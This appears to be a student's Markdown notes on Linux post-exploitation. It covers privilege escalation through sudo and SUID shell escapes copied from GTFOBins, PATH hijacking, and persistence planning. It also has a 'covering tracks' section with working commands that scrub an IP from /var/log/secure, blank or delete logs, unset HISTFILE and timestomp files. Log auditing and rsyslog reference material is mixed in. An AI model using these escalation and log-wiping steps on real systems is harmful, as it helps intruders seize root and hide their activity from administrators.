# Priveledge Escalation

To check a list of all the sudo commands that can be run 

	sudo -l

 To become root

 	sudo -i

# SUDO DEMO

	gtfobins.github.io

***SEARCH COMMANDS AND IT'LL TELL YOU WHAT RUNNING IT WILL DO***

Click on "sudo" button and then scroll down to find command "apt-get"
```
.. / apt-get 
Shell Sudo
Shell
It can be used to break out from restricted environments by spawning an interactive system shell.

This invokes the default pager, which is likely to be less, other functions may apply.

apt-get changelog apt
!/bin/sh
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

This invokes the default pager, which is likely to be less, other functions may apply.

sudo apt-get changelog apt
!/bin/sh
For this to work the target package (e.g., sl) must not be installed.

TF=$(mktemp)
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
sudo apt-get install -c $TF sl
When the shell exits the update command is actually executed.

sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

# SUID/SGID

Allow you to execute comands as root even though you are not root 

e.g. change password

## The find command is likely the best tool for finding binaries that are SGID or SUID:
```
find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files

find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files

find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files
```

For example, if the /usr/bin/nice executable is suid, it could be used to execute arbitrary commands via:

***ON GTFO BINS***

```
.. / nice 
Shell SUID Sudo
Shell
It can be used to break out from restricted environments by spawning an interactive system shell.

nice /bin/sh
SUID
If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
## SKIP THIS STEP, CMD WILL ALREADY BE ON BOX, DO NOT INSTALL

sudo install -m =xs $(which nice) .

./nice /bin/sh -p

## DO NOT USE "./" BECAUSE GTFO BINS ASSUMES YOU JUST DOWNLOADED TO CWD, JUST RUN COMMAND 

Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo nice /bin/sh
```

***USE COMMAND *id* TO SEE PERMISSIONS***


POSTULATE


# CHECK PATH

	echo $PATH

 If no "." in path change users with "su"

 OR

 	PATH=.:"/INSERT/PREVIOUS/PATH/"

  To Verify

  	echo $PATH

   Create script called "cat"
   
	vim cat

	#!/bin/bash
	echo "MEOWWW"


Add executable bit

	chmod +x cat 

Test It

	cat file

 Output should be 

 	MEOWWW

Because it now runs the script before running the executable due to the change in path

# Check crontab on system

	crontab -e

 Broken Down

 min hour day mon dow cmd

 # Search Word Writable Files and Directories by Current User

 	find / -type f -writable -o -type d -writable 2>/dev/null

 # Search Word Writable Files and Directories by Others

 	find / -type f -perm /2 -o -type d -perm /2 2>/dev/null

# Vulnerable Software and Services

Resources

exploit db

gtfobins


# Persitence

Should be able to survive reboot and login/logoff

Consider

	Access/Location

	User Schedule

 	How critical is system to infrastructure

  	How loud it is

   # Adding or Hijacking a User Account

Name Format

Logs

Pword reqs

Amount of Users

Use whatever net is using e.g. if system always uses ssh then use ssh vice other proto

# Boot Process Persistence

Persistence at Startup

# Cron Job

Establish persistence to survive reboot 

# Covering Your Tracks

Prior to gaining access to the box:

	Which of your actions could be reasonably expected to create a log?

	Within which logs would these anticipated entries be created?

	What, if anything can be done to prevent log entries from being generated?

After gaining access to the box:

	How to check logging settings on the box?

	What can you do to avoid further logging?

	What log files updated during your time on target?
	
Before exiting the box:

	What actions should I take to ensure my presence was not noticed?

	Would it be easier/better to modify the traces I left behind to not attribute to me?

When does Covering Tracks start?

	The Mission and Situation will dictate; however, items to consider are:

		What type of OS are we interacting with?

			Linux: unset HISTFILE

***Default logging rules are defined in /etc/rsyslog.d/50-default.conf on systemd based Linux distributions while custom configuration data is in /etc/rsyslog.conf***

```
auth,authpriv.*			/var/log/auth.log  
*.*;auth,authpriv.none		-/var/log/syslog 
#cron.*				/var/log/cron.log 
mail.info           /var/log/mail.log 
*.*                 @192.168.10.100 
```

# Linux auditing
Linux auditing commands and enumeration

ausearch

Auditing command that queries audit daemon logs. There are many options for this command, but a couple simple useful ways to use it are "ausearch -ua <username>"" to get events associated with a specific users, or "ausearch -m 

	ADD_USER,DEL_USER,USER_CHAUTHTOK,ADD_GROUP,DEL_GROUP,CHGRP_ID,ROLE_ASSIGN,ROLE_REMOVE -i" to get activity associated with users, groups, and role assignments.

 ```
ausearch -p 22
ausearch -m USER_LOGIN -sv no
ausearch -ua edwards -ts yesterday -te now -i
```

aureport

	Auditing command that produces summary reports of audit daemon logs.

journalctl

	If auditing events are logged using journald, then journalctl can be used to query audit events with the command "journalctl _TRANSPORT=audit"

```
journalctl _TRANSPORT=audit
journalctl _TRANSPORT=audit | grep 603
```

## Logs for Covering Tracks
Logs typically housed in /var/log & useful logs:



auth.log/secure

	Logins/authentications

lastlog

	Each users' last successful login time

btmp

	Bad login attempts

sulog

	Usage of SU command

utmp

	Currently logged in users (W command)

wtmp

	Permanent record on user on/off

# Working with Logs 

```
file /var/log/wtmp
find /var/log -type f -mmin -10 2> /dev/null
journalctl -f -u ssh
journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
```
# Reading Files
```
cat /var/log/auth.log | egrep -v "opened|closed"
awk '/opened/' /var/log/auth.log
last OR lastb OR lastlog
strings OR dd            # for data files
more /var/log/syslog
head/tail
```

# Cleaning The Logs
Before we start cleaning, save the INODE!

Affect on the inode of using mv VS cp VS cat

	All events will be logged and change modified time and accessed time in inode
 
 Save INODE beforehand to overwrite these logged events to appear as if nothing happend

 
# Linux Commands to Clear ASCII Logs

Removes the IP address 192.168.0.55 from /var/log/secure and places it in a new file called /tmp/secure.clean, moves the new file over the original file, and alters the timestamp in an attempt to make it look normal.

	grep -v "192.168.0.55" /var/log/secure > /tmp/secure.clean; mv /tmp/secure.clean /var/log/secure; touch -t 02180455 /var/log/secure

Overwrites the contents of the logfile with nothing clearing its contents.

	cat /dev/null > /path/to/logfile

Completely removes the log file.

	rm -rf /path/to/logfile

Can be used with head/tail to keep the desired portions of the log file and remove the rest. In this case, the most recent 50 entries are saved and the rest are removed.

	echo "$(tail -n 50 /var/log/auth.log)" > /var/log/auth.log

If bash is configured to save its log upon exit, then this will ensure that the current bash sessions' history is not saved.

	unset HISTFILE

 # Timestomp (Nix)
Access: updated when opened or used (grep, ls, cat, etc)

Modify: update content of file or saved

Change: file attribute change, file modified, moved, owner, permission

```
touch -c -t 201603051015 1.txt   # Explicit
touch -r 3.txt 1.txt    # Reference
```
# Rsyslog 

Newer Rsyslog references /etc/rsyslog.d/* for settings/rules

Older version only uses /etc/rsyslog.conf

Find out

	grep "IncludeConfig" /etc/rsyslog.conf

 ## Reading Rsyslog
Utilizes severity (priority) and facility levels

Rules filter out, and can use keyword or number

	<facility>.<priority>

```
kern.*                                                # All kernel messages, all severities
mail.crit
cron.!info,!debug
*.*  @192.168.10.254:514                                                    # Old format
*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
#mail.*
```

# Resource usage

## Linux resource usage commands

Show disk space utilization in "human reable" format

	df -h
 
Display amount of used and free memory in a system

	free

Show all UDP and TCP sockets.


	netstat -auntp

Display systems routing table


	netstat -rn

show all sockets without name resolution


	ss -an

show process information as well


	ss -anp

show all sockets with detailed information and process associated


	ss -aep

# init Type
```
ls -latr /proc/1/exe
stat /sbin/init
man init
init --version
ps 1

```





